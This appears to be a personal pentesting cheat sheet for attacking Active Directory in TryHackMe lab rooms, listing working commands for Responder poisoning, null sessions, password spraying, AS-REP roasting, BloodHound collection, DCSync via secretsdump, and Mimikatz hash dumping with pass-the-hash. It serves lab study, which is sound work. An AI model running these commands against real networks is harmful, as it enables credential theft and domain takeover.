
###### example ad boxes to test on:
https://tryhackme.com/room/attacktivedirectory - Free room (no null sessions)
https://tryhackme.com/room/breachingad - Free Room (network)
https://tryhackme.com/room/adenumeration - Free Room (network)
https://tryhackme.com/room/lateralmovementandpivoting - Subs only (network)
https://tryhackme.com/room/exploitingad - Subs only (network)
https://tryhackme.com/room/persistingad - Subs only (network)

### finding the dc - in a network

##### from a windows client
 
 should be easy :D
 add something here

##### from a linux client on a windows network

If you're on a linux box in a ad network port scan for 88 to find the dc (not for red team)

### port scan

normal full nmap scan ([[../../Boxes/TryHackMe/Attacktive Directory (Done)/1 - nmap|nmap scan example]])
`nmap -p- -sC -sV -Pn 10.10.10.10`

##### common ports on a dc

53 dns
88 kerberos

139+445 smb

389 ldap
636 ldap ssl
3268 global ldap
3269 global ldap ssl

5985 rdp

### hosts file

Add all names inthe nmap scan to the `/etc/hosts` file
- Kerberos - FQDN (fully qualified domain name) of the domain controller - because tickets embed domain names and SPNs (service principal names)
- SMB - NetBIOS or DNS names - for NTLM handshakes

Examples from [[../../Boxes/TryHackMe/Attacktive Directory (Done)/1 - nmap|1 - nmap]]:
- NetBIOS name: `ATTACKTIVEDIREC`
- NetBIOS Domain name: `THM-AD`
- DNS name: `AttacktiveDirectory.spookysec.local`
- DNS Domain name: `spookysec.local`

Example line in `/etc/hosts`:
`10.10.200.51    AttacktiveDirectory.spookysec.local spookysec.local ATTACKTIVEDIREC THM-AD`

### dc time

in the nmap scan we see something like
`88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-02 21:05:34Z)`

for some things we need a similar time as the dc (within one minute)
##### syncing time from linux

`sudo rdate -n <ipmachine>`


### Listen with responder

start responder so it's there listening in the background
`sudo responder -I tun0 -wd`

- more: [[../29 - C2s, listening tools/responder|responder]] 
- examples to make people connect to responder:
	- send an e-mail with a smb link
	- get a smb link out some other way


### Basic Enumeration

##### null sessions

`nxc smb 10.10.10.10`
`nxc smb 10.10.10.10 -u '' -p ''`

`nxc smb 10.10.10.10 -u 'guest' -p ''`
`nxc smb 10.10.10.10 -u 'guest' -p '' --shares`

`smbclient -U '' -N -L //10.10.10.10` (-N = no pass)

### User... Enumeration

##### username but no password?
brute force password
`nxc smb 10.10.10.10 -u 'username' -p 'password-file'`

##### Finding user names
Is there a web page?
Files on shares (null session)?
Other ports open, like ftp?

##### [[impacket-GetNPUsers]]

`impacket-GetNPUsers spookysec.local/ -usersfile userlist.txt -no-pass -dc-ip 10.10.10.10`
- gives hashcat hash - just sent it as it is to hashcat

##### [[kerbrute]]

Enumerating users
`~/tools/kerbrute userenum -d domain.com --dc 10.10.10.10 usernames.txt` 

Password spray
`~/tools/kerbrute passwordspray -d domain.com --dc 10.10.10.10 domain_users.txt password123`

Brute force specific user
`~/tools/kerbrute bruteuser -d domain.com --dc 10.10.10.10 passwords.txt usernamehere`

Brute Force with creds pairs in file
`~/tools/kerbrute bruteforce -d domain.com --dc 10.10.10.10 creds-pairs.txt`

##### nxc smb users file brute force

`nxc smb 10.10.106.240 -u users.txt -p '' --kerberos` (req hosts file entries)
- finds vuln accounts


### Escalation - When we own a user

enum usernames
`nxc smb 10.10.10.10 -u 'sofia' -p 'mypass1' --rid-brute`
(rid is the end of the sid)

get password policy
`nxc smb 10.10.10.10 -u 'sofia' -p 'mypass1' --pass-pol`

list files on shares (can download too)
`nxc smb 10.10.10.10 -u '' -p '' -M spider_plus`

##### DNS dump

`bloodyAD --host 10.129.176.2 -d return.local -u 'return\svc-printer' -p '1edFg43012!!' get dnsDump`

##### Are 5985/5986/47001 open? [[../09 - Windows Exploration/Evil-WinRM|Evil-WinRM]]
`evil-winrm -i 10.10.10.10 -u username -p password`
(Requires admin or remote management permissions)

##### RDP
TODO!


add stuff on:
ldapsearch
impacket-owneredit
impacket-dacledit
bloodyAD

##### [[ldapdomaindump - dump domain info]]
`ldapdomaindump ldap://10.10.10.10 -u 'domain.com\\mynormaluser' -p 'mypassword'`
- check the description field from users and computers
- check if some users have logged in - might be honey pots

##### [[Bloodhound]]

clear old data:
- Go to neo4j at http://localhost:7474
- In the field containing `neo4j$`, enter `MATCH (n) DETACH DELETE n;`

on windows:
`Sharphound.exe --CollectionMethods All --Domain domain.com --ExcludeDCs`
Stealthier option:
`SharpHound.exe -c Session,LocalAdmin,Trusts,ACL `

from linux:
`bloodhound-python -u mynormaluser -p 'mypassword' -d domain.com -dc ad01.domain.com -ns 10.10.10.10 -c all`
	-c works the same as with sharphound (if you want the stealthier version)

Starting Bloodhound:
`bloodhound --no-sandbox`
- opens http://127.0.0.1:8080
- neo4j available at http://localhost:7474

##### [[../09 - Windows Exploration/impacket-secretsdump|impacket-secretsdump]]

when you have local files
`impacket-secretsdump -sam sam.hive -system system.hive "DC01$":@10.10.232.150`

when you have `dcsync` permissions
`impacket-secretsdump spookysec.local/backup:backup2517860@10.10.229.142 -just-dc`


##### if we have rdp + local admin
check for local admin
`net localgroup administrators`
with bloodhound we can see what users have current sessions on this computer and we can see if any of these users have permissions we want.
run mimikatz on the computer to dump local lsass hashes
`. .\Invoke-Mimikatz.ps1`
`Invoke-Mimikatz`
if we get a hash from a high priv user on the domain we can start a new ps as this user
`Invoke-Mimikatz -command '"sekurlsa::pth /user:privusername /domain:domain.com /ntlm:thehashwegot /run:powershell.exe"'`






### If we got nowhere

[[pentest ad SVG]]
[[Links (AD)]]
...
